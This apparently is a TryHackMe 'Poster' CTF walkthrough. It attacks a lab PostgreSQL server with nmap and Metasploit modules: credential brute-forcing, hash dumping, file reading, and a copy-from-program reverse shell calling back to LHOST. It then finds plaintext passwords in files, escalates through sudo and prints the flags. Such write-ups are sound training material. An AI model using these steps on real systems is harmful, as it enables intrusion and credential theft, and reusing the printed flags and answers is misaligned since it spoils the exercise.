# <div align="center">[Poster - TryHackMe Walthrough](https://tryhackme.com/room/poster)</div>
<div align="center">The sys admin set up a rdbms in a safe way.</div>
<div align="center">
	<img width="200" height="200" alt="poster" src="https://github.com/user-attachments/assets/fa33b981-f75a-4c11-b2db-8e4a32367a5e" />
</div>

## Task 1. Flag

### What is rdbms?

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

Are you able to complete the challenge?
The machine may take up to 5 minutes to boot and configure

### *Answer the questions below*
#### What is the rdbms installed on the server?
```
```

### What port is the rdbms running on?
```
```

### Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information.
```
No answer needed
```

### After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
```
```

### What are the credentials you found?
```
```

---
## Initial Enumeration

I started with a basic Nmap scan to identify the exposed services running on the target machine.

```bash
~$ nmap -sV 10.49.190.166

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
```

The scan revealed three open ports:

* SSH running on port `22`
* HTTP running on port `80`
* PostgreSQL running on port `5432`

At this stage, the PostgreSQL service immediately stood out since the room description hinted toward an RDBMS setup.

---

# Finding Vulnerability

To interact with the PostgreSQL service, I moved into Metasploit and started looking for available PostgreSQL auxiliary modules.

```bash
msfconsole -q
```

After launching Metasploit, I searched for PostgreSQL-related auxiliary modules.

```bash
search auxiliary postgresql
```

The results displayed several PostgreSQL modules available inside Metasploit.

One module that immediately caught my attention was:

```bash
auxiliary/scanner/postgres/postgres_login
```

This module is used to brute force PostgreSQL credentials using common usernames and passwords.

I selected the module using:

```bash
use 4
```

<img width="1741" height="437" alt="image" src="https://github.com/user-attachments/assets/5bee1383-47a1-4d8d-a125-dbacfa8b56ff" />

Before running it, I checked the required configuration.

```bash
show config
```

The only mandatory value that needed to be configured was the target IP address.

```bash
set RHOSTS <IP>
```

<img width="1887" height="914" alt="image" src="https://github.com/user-attachments/assets/22562c38-3087-45ec-8900-6bb2fb75af59" />


With the configuration completed, I executed the module.

```bash
run
```

<img width="1381" height="655" alt="image" src="https://github.com/user-attachments/assets/0e2aff5c-181e-4006-9a5c-e7b7811328b2" />

The scan successfully discovered valid PostgreSQL credentials:

```bash
postgres:password
```

Now that I had working credentials, the next step was to find a module that would allow authenticated interaction with the PostgreSQL server.

I returned back and searched for PostgreSQL auxiliary modules again.

```bash
back
search auxiliary postgresql
```

<img width="1744" height="500" alt="image" src="https://github.com/user-attachments/assets/fbcd69ee-c7d5-42ee-9b4b-fc919c0e2981" />

This time, I selected:

```bash
auxiliary/admin/postgres/postgres_sql
```

The module allows execution of SQL queries against the PostgreSQL server using valid credentials.

I configured the module with the discovered password and target IP.

```bash
use 6
show options
set RHOSTS <IP>
set PASSWORD password
```

<img width="1428" height="822" alt="image" src="https://github.com/user-attachments/assets/2da4da05-d8cf-42c7-9ab3-fcae33fc3780" />


After setting the required options, I ran the module.

```bash
run
```


The authentication succeeded, confirming valid access to the PostgreSQL database server.

```bash
PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```

<img width="1185" height="252" alt="image" src="https://github.com/user-attachments/assets/fd1aa141-ca4a-4ade-8b01-16299fb9f422" />

# Credential Discovery

After confirming authenticated access to PostgreSQL, my next objective was to dump the database user hashes.

I returned back to the Metasploit console and searched for a module related to PostgreSQL hash dumping.

```bash id="l9h3pj"
back
search auxiliary scanner postgre hashdump
```

<img width="1194" height="264" alt="image" src="https://github.com/user-attachments/assets/e87ea55a-58cd-4487-bb29-067cf0cbd048" />

The search returned the PostgreSQL hashdump module, which can extract password hashes from the database.

I selected the module and configured it with the previously discovered credentials.

```bash id="k1f6xa"
use 0
show options
set RHOST 10.49.190.166
set PASSWORD password
```

<img width="1429" height="683" alt="image" src="https://github.com/user-attachments/assets/399ee9d4-124d-41be-8668-9791f3d064a5" />

Once everything was configured, I executed the module.

```bash id="j84dpl"
run
```

<img width="644" height="387" alt="image" src="https://github.com/user-attachments/assets/d99b6e3c-15c5-484c-867b-675b7e98d5e2" />

The module successfully dumped the PostgreSQL user hashes from the server.

---

# User Enumeration

With authenticated database access confirmed, I moved on to another PostgreSQL auxiliary module that allows reading files directly from the target system.

I went back again and searched for PostgreSQL auxiliary modules.

```bash id="93h5yz"
back
search auxiliary postgresql
```

From the available modules, I selected:

```bash id="8d7qef"
auxiliary/admin/postgres/postgres_readfile
```

Alternatively, it could also be selected directly using:

```bash id="k0e8vc"
use 5
```

<img width="1744" height="480" alt="image" src="https://github.com/user-attachments/assets/9817035a-d7a5-47e3-bcfa-c91586525e93" />

Before running the module, I checked the available options.

```bash id="9a2r7m"
show options
```

<img width="1456" height="781" alt="image" src="https://github.com/user-attachments/assets/3a807664-cb93-46f5-a799-817ccaf559d6" />

After configuring the required parameters, I executed the module.

```bash id="t3g1kr"
run
```

<img width="1097" height="748" alt="image" src="https://github.com/user-attachments/assets/67192a58-b5e5-49e1-9ef4-f5d8128f737b" />

The module successfully read files from the target machine using the authenticated PostgreSQL session.

<img width="1291" height="630" alt="image" src="https://github.com/user-attachments/assets/d60f641e-1792-4adf-9788-9ec59c75e1c2" />

---
---

now we need to run module that allows arbitrary command execution with the proper user credentials

> back
> search exploit postgres cmd
Let use  `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`
> use 0

<img width="1475" height="473" alt="image" src="https://github.com/user-attachments/assets/0e649f12-b3f4-4584-985c-8858278396e3" />

Let config it 

> show options
> set RHOST <IP>
> set Password password
> set LHOST tun0
<img width="1447" height="918" alt="image" src="https://github.com/user-attachments/assets/cd5b6913-74e8-4146-9a1d-318535e533cf" />

now run

> run

<img width="1603" height="438" alt="image" src="https://github.com/user-attachments/assets/67b50e92-43f4-4939-b84f-f3d2436f1f73" />

We get the shell 
let stable the shell 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
<img width="1605" height="551" alt="image" src="https://github.com/user-attachments/assets/758eaed8-8aeb-441a-9107-0a8d1b0485ad" />

Priv esc as dark
after entring in system i try to find and got 2 user dir in home alison contain user flag but we dont have permission to chec it then i check dark and find credential for dark 
```
cd /home
cat /home/dark/credentials.txt
dark:qwerty1234#!hackme
```
<img width="853" height="558" alt="image" src="https://github.com/user-attachments/assets/db632694-0771-469a-a859-c76c5a956ee6" />

Let use ssh to login and get shell

```
death@esther:~$ ssh dark@10.49.190.166
dark@10.49.190.166's password: qwerty1234#!hackme
$ 
```

We still dont have perm to view the flag let take a look at config file maybe we can find something there 
```
$ cat /home/alison/user.txt
cat: /home/alison/user.txt: Permission denied
$ cd /var/www/html/   
$ ls
config.php  poster
$ cat config.php
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>$ 
```
Crazy we got alison password now we can login 

Let Login as Alison
```
$ su alison
Password: p4ssw0rdS3cur3!#
$ su alison
Password: 
alison@ubuntu:/var/www/html$ cd
alison@ubuntu:~$ cat user.txt 
```

## User flag.txt
```
THM{postgresql_fa1l_conf1gurat1on}
```

## Privilege Escalation Enumeration
```
sudo -l
```

```
alison@ubuntu:~$ sudo  -l
[sudo] password for alison: p4ssw0rdS3cur3!#
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:~$ sudo -s
root@ubuntu:~# cat /root/root.txt 
```
## Root Flag
```
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```
